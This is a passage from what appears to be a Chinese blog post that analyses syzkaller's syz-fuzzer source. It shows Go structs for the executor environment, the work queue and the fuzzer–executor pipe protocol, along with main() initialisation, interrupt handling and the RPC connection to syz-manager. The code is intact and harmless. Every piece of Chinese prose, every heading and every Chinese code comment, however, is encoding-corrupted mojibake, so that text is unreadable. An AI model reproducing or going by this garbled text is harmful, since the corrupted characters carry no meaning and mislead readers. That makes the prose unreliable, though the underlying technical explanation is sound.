<span class="hljs-type">int</span><br>env             *ipc.Env<br>rnd             *rand.Rand<br>execOpts        *ipc.ExecOpts<br>execOptsCollide *ipc.ExecOpts<br>execOptsCover   *ipc.ExecOpts<br>execOptsComps   *ipc.ExecOpts<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>env</code> æˆå‘˜ç”¨ä»¥è¡¨ç¤ºå•ä¸ª syz-executor çš„è¿è¡Œç¯å¢ƒï¼Œå®šä¹‰äº <code>pkg/ipc/ipc.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Env-&gt;cmd</code> åˆ™ç”¨ä»¥è¡¨ç¤ºæ‰§è¡Œ syz-executor çš„å‘½ä»¤ä¿¡æ¯ï¼ŒåŒ…æ‹¬ pidã€é…ç½®ã€å‘½ä»¤è¡Œå‚æ•°ç­‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> command <span class="hljs-keyword">struct</span> &#123;<br>pid      <span class="hljs-type">int</span><br>config   *Config<br>timeout  time.Duration<br>cmd      *exec.Cmd<br>dir      <span class="hljs-type">string</span><br>readDone <span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span><br>exited   <span class="hljs-keyword">chan</span> <span class="hljs-type">error</span><br>inrp     *os.File<br>outwp    *os.File<br>outmem   []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>command-&gt;cmd</code> ä¸ºæœ€ç»ˆç”¨æ¥æ‰§è¡Œ syz-executor çš„å‘½ä»¤è¡Œï¼Œæ¥è‡ªäº golang åŸç”Ÿçš„ exec åº“</p><h3 id="4-WorkQueueï¼šå¾…ä½¿ç”¨çš„å•-syz-fuzer-çš„å…¨å±€è¾“å…¥é˜Ÿåˆ—"><a href="#4-WorkQueueï¼šå¾…ä½¿ç”¨çš„å•-syz-fuzer-çš„å…¨å±€è¾“å…¥é˜Ÿåˆ—" class="headerlink" title="4. WorkQueueï¼šå¾…ä½¿ç”¨çš„å• syz-fuzer çš„å…¨å±€è¾“å…¥é˜Ÿåˆ—"></a>4. WorkQueueï¼šå¾…ä½¿ç”¨çš„å• syz-fuzer çš„å…¨å±€è¾“å…¥é˜Ÿåˆ—</h3><p>åœ¨ syz-fuzzer å½“ä¸­æ‰€æœ‰çš„è¾“å…¥éƒ½è¢«å­˜æ”¾åœ¨ <code>WorkQueue</code> é˜Ÿåˆ—å½“ä¸­ï¼Œä¸€ä¸ª syz-fuzzer å¯èƒ½ä¼šå¯åŠ¨å¤šä¸ª syz-executor è¿›ç¨‹ï¼Œä»–ä»¬å…±äº«åŒä¸€ä¸ª <code>WorkQueue</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkQueue å­˜æ”¾å…¨å±€çš„ non-fuzzing å·¥ä½œé¡¹ç›® (å‚è§ä¸‹é¢çš„ Work* ç»“æ„ä½“).</span><br><span class="hljs-comment">// WorkQueue ä¹Ÿåœ¨å·¥ä½œé¡¹ç›®é—´è¿›è¡Œä¼˜å…ˆæ’åºï¼Œä¾‹å¦‚æˆ‘ä»¬æƒ³è¦åœ¨æˆ‘ä»¬ç¢ç‰‡åŒ–ç¨‹åºå‰</span><br><span class="hljs-comment">// åˆ†ç±»å¹¶å‘ manager å‘é€æ–°çš„è¾“å…¥ä»¥åœ¨ VM å´©æºƒçš„æƒ…å†µä¸‹ä¸ä¼šæ°¸ä¹…å¤±å»æœ‰è¶£çš„ç¨‹åº.</span><br><span class="hljs-comment">//ï¼ˆè¯‘æ³¨ï¼šinteresting input åœ¨ fuzzing ä¸­æ˜¯ç»å…¸æ¦‚å¿µäº†ï¼Œè¿™é‡Œåº”è¯¥ä¸éœ€è¦ç¬”è€…æ³¨é‡Šäº†ï¼‰</span><br><span class="hljs-keyword">type</span> WorkQueue <span class="hljs-keyword">struct</span> &#123;<br>mu              sync.RWMutex<br>triageCandidate []*WorkTriage<br>candidate       []*WorkCandidate<br>triage          []*WorkTriage<br>smash           []*WorkSmash<br><br>procs          <span class="hljs-type">int</span><br>needCandidates <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>WorkQueue</code> ä¸º <code>WorkTriage/WorkCandidate/WorkSmash</code> éƒ½åˆ†åˆ«å»ºç«‹äº†ä¸€ä¸ªæ–°çš„é˜Ÿåˆ— </p><h2 id="fuzzer-amp-executor-é€šä¿¡ç›¸å…³"><a href="#fuzzer-amp-executor-é€šä¿¡ç›¸å…³" class="headerlink" title="fuzzer &amp; executor é€šä¿¡ç›¸å…³"></a>fuzzer &amp; executor é€šä¿¡ç›¸å…³</h2><h3 id="1-executeReqï¼šfuzzerâ†’executor-è¯·æ±‚å¤´"><a href="#1-executeReqï¼šfuzzerâ†’executor-è¯·æ±‚å¤´" class="headerlink" title="1. executeReqï¼šfuzzerâ†’executor è¯·æ±‚å¤´"></a>1. executeReqï¼šfuzzerâ†’executor è¯·æ±‚å¤´</h3><p>fuzzing çš„ä¸»ä½“è¿›ç¨‹ç”± syz-fuzzer å®Œæˆï¼Œsyz-executor ä»…éœ€è¦å®Œæˆå•ä¸ªè¾“å…¥ç¨‹åºçš„è¿è¡Œï¼Œå› æ­¤ syz-fuzzer éœ€è¦å¤šæ¬¡ä¸ syz-executor é—´é€šä¿¡ï¼šå‘é€å¾…è¿è¡Œçš„æ•°æ®å¹¶æ¥æ”¶è¿è¡Œç»“æœ</p><p>syz-fuzzer ä¸ syz-executor é—´é€šä¿¡é€šè¿‡ç®¡é“å®Œæˆï¼Œå› æ­¤æ¯æ¬¡é€šä¿¡å‰ syz-fuzzer éœ€è¦æ‰‹åŠ¨å‘Šè¯‰ syz-executor æœ¬æ¬¡å¾…æ¥æ”¶çš„æ•°æ®ç±»å‹ã€é•¿åº¦ç­‰ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯è¢«å°è£…åœ¨å›ºå®šå¤§å°çš„ <code>executeReq</code> ç»“æ„ä½“å½“ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReq <span class="hljs-keyword">struct</span> &#123;<br>magic            <span class="hljs-type">uint64</span><br>envFlags         <span class="hljs-type">uint64</span> <span class="hljs-comment">// env flags</span><br>execFlags        <span class="hljs-type">uint64</span> <span class="hljs-comment">// exec flags</span><br>pid              <span class="hljs-type">uint64</span><br>syscallTimeoutMS <span class="hljs-type">uint64</span><br>programTimeoutMS <span class="hljs-type">uint64</span><br>slowdownScale    <span class="hljs-type">uint64</span><br>progSize         <span class="hljs-type">uint64</span><br><span class="hljs-comment">// è¯¥ç»“æ„ä½“ä¹‹åè·Ÿç€ä¸€ä¸ª encodingexec æ ¼å¼çš„åºåˆ—åŒ–çš„æµ‹è¯•ç¨‹åº.</span><br><span class="hljs-comment">// Both when sent over a pipe or in shared memory.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç†è§£ä¸º <code>executeReq</code> ä¸ºå•æ¬¡è¯·æ±‚çš„è¯·æ±‚å¤´ï¼Œåé¢è·Ÿç€çš„åºåˆ—åŒ–è¾“å…¥ç¨‹åº <code>progData</code> ä¸ºå•æ¬¡è¯·æ±‚çš„è¯·æ±‚ä½“ï¼Œæ•… syz-fuzzer å‘ syz-executor å‘é€å•ä¸ªç¨‹åºæ‰§è¡Œè¯·æ±‚çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><h3 id="2-executeReply-amp-callReplyï¼šexecutor-æ–¹å“åº”çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç»“æœ"><a href="#2-executeReply-amp-callReplyï¼šexecutor-æ–¹å“åº”çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç»“æœ" class="headerlink" title="2. executeReply &amp; callReplyï¼šexecutor æ–¹å“åº”çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç»“æœ"></a>2. executeReply &amp; callReplyï¼šexecutor æ–¹å“åº”çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç»“æœ</h3><p>æœ‰æ”¶ä¾¿æœ‰å‘ï¼Œsyz-executor åœ¨å®Œæˆæ‰§è¡Œåä¼šé€šè¿‡å¦ä¸€ä¸ªç®¡é“å°†æ‰§è¡Œç»“æœå‘é€ç»™ syz-fuzzerï¼Œç”±äº syzkaller ä»¥å•ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ºæ‰§è¡Œçš„æœ€å°ç²’åº¦ï¼Œå› æ­¤syz-executor æ¯æ¬¡è¿”å›ç»™ syz-fuzzer çš„ä¾¿æ˜¯<strong>å•ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œç»“æœ</strong>ï¼Œä½¿ç”¨ä¸€ä¸ªå¤´éƒ¨ <code>executeReply</code> æ ‡è¯†ä¿¡æ¯ï¼Œä½¿ç”¨ <code>callReply</code> å­˜å‚¨å…·ä½“ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> executeReply <span class="hljs-keyword">struct</span> &#123;<br>magic <span class="hljs-type">uint32</span><br><span class="hljs-comment">// If done is 0, then this is call completion message followed by callReply.</span><br><span class="hljs-comment">// If done is 1, then program execution is finished and status is set.</span><br>done   <span class="hljs-type">uint32</span><br>status <span class="hljs-type">uint32</span><br>&#125;<br><br><span class="hljs-keyword">type</span> callReply <span class="hljs-keyword">struct</span> &#123;<br>magic      <span class="hljs-type">uint32</span><br>index      <span class="hljs-type">uint32</span> <span class="hljs-comment">// call index in the program</span><br>num        <span class="hljs-type">uint32</span> <span class="hljs-comment">// syscall number (for cross-checking)</span><br>errno      <span class="hljs-type">uint32</span><br>flags      <span class="hljs-type">uint32</span> <span class="hljs-comment">// see CallFlags</span><br>signalSize <span class="hljs-type">uint32</span><br>coverSize  <span class="hljs-type">uint32</span><br>compsSize  <span class="hljs-type">uint32</span><br><span class="hljs-comment">// signal/cover/comps follow</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeReply</code> ä¸­çš„ done æ ‡å¿—ä½ç”¨ä»¥æ ‡è¯†ä¼ è¾“æ˜¯å¦ç»“æŸï¼Œå¯¹äºæ¥è‡ª syz-fuzzer çš„å•æ¬¡æ‰§è¡Œè¯·æ±‚ï¼Œsyz-executor çš„è¿”å›ç»“æœå¦‚ä¸‹ï¼ˆä»¥ä¸€ä¸ª <code>done != 0</code> çš„ <code>executeReply</code> ä½œä¸ºç»ˆæ­¢ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><h1 id="0x02-main-ï¼šä¸-manager-å»ºç«‹-RPC-è¿æ¥ï¼Œè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"><a href="#0x02-main-ï¼šä¸-manager-å»ºç«‹-RPC-è¿æ¥ï¼Œè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ" class="headerlink" title="0x02. main()ï¼šä¸ manager å»ºç«‹ RPC è¿æ¥ï¼Œè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ"></a>0x02. main()ï¼šä¸ manager å»ºç«‹ RPC è¿æ¥ï¼Œè¿›è¡Œåˆå§‹åŒ–å·¥ä½œ</h1><p>æˆ‘ä»¬è¿˜æ˜¯æŒ‰ç…§æƒ¯ä¾‹ä»ç¨‹åºå…¥å£ç‚¹è¿›è¡Œåˆ†æï¼Œ<code>syz-fuzzer()</code> çš„ <code>main()</code> å‡½æ•°åšçš„å·¥ä½œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦è¿˜æ˜¯ä¸€äº›åˆå§‹åŒ–å·¥ä½œä»¥åŠå¼•å¯¼åç»­å·¥ä½œæµç¨‹</p><h2 id="åˆå§‹åŒ–å‚æ•°è§£æä¸-RPC-è¿æ¥ï¼Œè·å–è¯­æ–™åº“ä¸è¾“å…¥"><a href="#åˆå§‹åŒ–å‚æ•°è§£æä¸-RPC-è¿æ¥ï¼Œè·å–è¯­æ–™åº“ä¸è¾“å…¥" class="headerlink" title="åˆå§‹åŒ–å‚æ•°è§£æä¸ RPC è¿æ¥ï¼Œè·å–è¯­æ–™åº“ä¸è¾“å…¥"></a>åˆå§‹åŒ–å‚æ•°è§£æä¸ RPC è¿æ¥ï¼Œè·å–è¯­æ–™åº“ä¸è¾“å…¥</h2><h3 id="Step-I-ä¸€äº›åˆå§‹åŒ–å·¥ä½œ"><a href="#Step-I-ä¸€äº›åˆå§‹åŒ–å·¥ä½œ" class="headerlink" title="Step.I - ä¸€äº›åˆå§‹åŒ–å·¥ä½œ"></a>Step.I - ä¸€äº›åˆå§‹åŒ–å·¥ä½œ</h3><p>ä¸€å¼€å§‹è¿˜æ˜¯æƒ¯ä¾‹çš„å„ç§åˆå§‹åŒ–å’Œé…ç½®å‚æ•°è§£æå·¥ä½œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nolint: funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>debug.SetGCPercent(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">var</span> (<br>flagName     = flag.String(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;unique name for manager&quot;</span>)<br>flagOS       = flag.String(<span class="hljs-string">&quot;os&quot;</span>, runtime.GOOS, <span class="hljs-string">&quot;target OS&quot;</span>)<br>flagArch     = flag.String(<span class="hljs-string">&quot;arch&quot;</span>, runtime.GOARCH, <span class="hljs-string">&quot;target arch&quot;</span>)<br>flagManager  = flag.String(<span class="hljs-string">&quot;manager&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;manager rpc address&quot;</span>)<br>flagProcs    = flag.Int(<span class="hljs-string">&quot;procs&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;number of parallel test processes&quot;</span>)<br>flagOutput   = flag.String(<span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;stdout&quot;</span>, <span class="hljs-string">&quot;write programs to none/stdout/dmesg/file&quot;</span>)<br>flagTest     = flag.Bool(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable image testing mode&quot;</span>)      <span class="hljs-comment">// used by syz-ci</span><br>flagRunTest  = flag.Bool(<span class="hljs-string">&quot;runtest&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable program testing mode&quot;</span>) <span class="hljs-comment">// used by pkg/runtest</span><br>flagRawCover = flag.Bool(<span class="hljs-string">&quot;raw_cover&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;fetch raw coverage&quot;</span>)<br>)<br><span class="hljs-keyword">defer</span> tool.Init()()<br>outputType := parseOutputType(*flagOutput)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fuzzer started&quot;</span>)<br><br>target, err := prog.GetTarget(*flagOS, *flagArch)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br><br>config, execOpts, err := ipcconfig.Default(target)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create default ipc config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> *flagRawCover &#123;<br>execOpts.Flags &amp;^= ipc.FlagDedupCover<br>&#125;<br>timeouts := config.Timeouts<br>sandbox := ipc.FlagsToSandbox(config.Flags)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆ›å»ºä¸€ä¸ª <code>shutdown</code> channel å¹¶å¯åŠ¨ä¸€ä¸ªåç¨‹è¿›è¡Œç›‘æµ‹ï¼Œå½“è¯¥ channel æœ‰æ•°æ®æ—¶è¯´æ˜é‡åˆ°äº†ä¸€äº›æƒ…å†µï¼Œæ­¤æ—¶ syz-fuzzer éœ€è¦ä¸»åŠ¨é€€å‡º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">shutdown := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>osutil.HandleInterrupts(shutdown)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Handles graceful preemption on GCE.</span><br>&lt;-shutdown<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYZ-FUZZER: PREEMPTED&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>osutil.HandleInterrupts()</code> åˆ™æ˜¯ä¸€ä¸ªæ ¹æ®ä¸åŒçš„ç›®æ ‡ os è¿›è¡Œå®šåˆ¶çš„å‡½æ•°ï¼Œå¯¹äº unix ç³» os è€Œè¨€è¯¥å‡½æ•°å®šä¹‰äº <code>osutil_unix.go</code> ä¸­ï¼Œå…¶ä¼šç­‰å¾…æ”¶åˆ°ä¸‰ä¸ª SIGINT ä¿¡å·æ‰çœŸæ­£å…³é—­ç¨‹åºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandleInterrupts åœ¨ç¬¬ä¸€ä¸ª SIGINT æ—¶å…³é—­ shutdown chan</span><br><span class="hljs-comment">// (å¸Œæœ›ç¨‹åºèƒ½ä¼˜é›…åœ° shutdown å¹¶ exit)</span><br><span class="hljs-comment">// å¹¶åœ¨ç¬¬ä¸‰ä¸ª SIGINT æ—¶ç»ˆæ­¢ç¨‹åº.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleInterrupts</span><span class="hljs-params">(shutdown <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">3</span>)<br>signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)<br>&lt;-c<br><span class="hljs-built_in">close</span>(shutdown)<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down harder...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: terminating\n&quot;</span>)<br>os.Exit(<span class="hljs-type">int</span>(syscall.SIGINT))<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-II-ä¸-syz-manager-é—´å»ºç«‹-RPC-é€šä¿¡ï¼ŒåŠ è½½è¯­æ–™åº“"><a href="#Step-II-ä¸-syz-manager-é—´å»ºç«‹-RPC-é€šä¿¡ï¼ŒåŠ è½½è¯­æ–™åº“" class="headerlink" title="Step.II - ä¸ syz-manager é—´å»ºç«‹ RPC é€šä¿¡ï¼ŒåŠ è½½è¯­æ–™åº“"></a>Step.II - ä¸ syz-manager é—´å»ºç«‹ RPC é€šä¿¡ï¼ŒåŠ è½½è¯­æ–™åº“</h3><p>å›åˆ° <code>main()</code> ä¸­ï¼Œæ¥ä¸‹æ¥ä¼šæ”¶é›† Guest ä¿¡æ¯å¹¶å°è¯•ä¸ Hostï¼ˆsyz-managerï¼‰ é—´å»ºç«‹ RPC è¿æ¥ï¼Œè‹¥å¤±è´¥åˆ™ç›´æ¥é€€å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬ä¼ ç»™ syz-manager çš„æ˜¯ <code>rpctype.ConnectArgs</code>ï¼Œæ”¶åˆ°çš„å“åº”ç»“æœä¸º <code>rpctype.ConnectRes</code> ï¼Œå…¶ä¸­åŒ…å«æœ‰å¾ˆå¤šä¿¡æ¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">checkArgs := &amp;checkArgs&#123;<br>target:         target,<br>sandbox:        sandbox,<br>ipcConfig:      config,<br>ipcExecOpts:    execOpts,<br>gitRevision:    prog.GitRevision,<br>targetRevision: target.Revision,<br>&#125;<br><span class="hljs-keyword">if</span> *flagTest &#123;<br>testImage(*flagManager, checkArgs)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>machineInfo, modules := collectMachineInfos(target)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;dialing manager at %v&quot;</span>, *flagManager)<br>manager, err := rpctype.NewRPCClient(*flagManager, timeouts.Scale)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create an RPC client: %v &quot;</span>, err)<br>&#125;<br><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;connecting to manager...&quot;</span>)<br>a := &amp;rpctype.ConnectArgs&#123;<br>Name:        *flagName,<br>MachineInfo: machineInfo,<br>Modules:     modules,<br>&#125;<br>r := &amp;rpctype.ConnectRes&#123;&#125;<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Connect&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to call Manager.Connect(): %v &quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer ä¸­çš„ RPC éƒ½ä¼šè°ƒç”¨åˆ° <code>syz-manager/rpc.go</code> ä¸­çš„ <code>RPCServer</code> çš„æˆå‘˜å‡½æ•°ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šè°ƒç”¨åˆ° syz-manager ä¸Šçš„ <code>Connect()</code> å‡½æ•°è¿›è¡Œè¿æ¥ï¼Œå…¶æ ¸å¿ƒæ˜¯è°ƒç”¨ <code>RPCServer.RPCManagerView.fuzzerConnect()</code> æœ€å°åŒ–è¯­æ–™åº“å¹¶æ‹·è´ BugFrame ç­‰ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å±•å¼€åˆ†æäº†ï¼šï¼‰</p><p>æ¥ä¸‹æ¥è§£æè¦å¼€å¯çš„ç‰¹æ€§æ ‡å¿—ä½ï¼›éšåæ£€æŸ¥ä¸ syz-manager è¿›è¡Œ RPC è¿æ¥çš„å“åº”ç»“æœä¸­çš„ <code>CoverFilterBitmap</code> æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™å†™å…¥åˆ° <code>&quot;syz-cover-bitmap&quot;</code> æ–‡ä»¶ä¸­ï¼Œè¯¥ä¿¡æ¯ä¸»è¦æ˜¯ç»™ syz-executor ç”¨çš„ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">featureFlags, err := csource.ParseFeaturesFlags(<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := osutil.WriteFile(<span class="hljs-string">&quot;syz-cover-bitmap&quot;</span>, r.CoverFilterBitmap); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write syz-cover-bitmap: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åè‹¥ syz-manager è¿”å›ç»“æœä¸­çš„ <code>CheckResult</code> ä¸ºç©ºï¼Œåˆ™é‡æ–°ç”Ÿæˆé…ç½®ä¿¡æ¯åé€šè¿‡ RPC è°ƒç”¨ syz-manager çš„ <code>Manager.Check()</code> ï¼Œè‹¥æœ‰é”™è¯¯åˆ™ç›´æ¥é€€å‡ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> 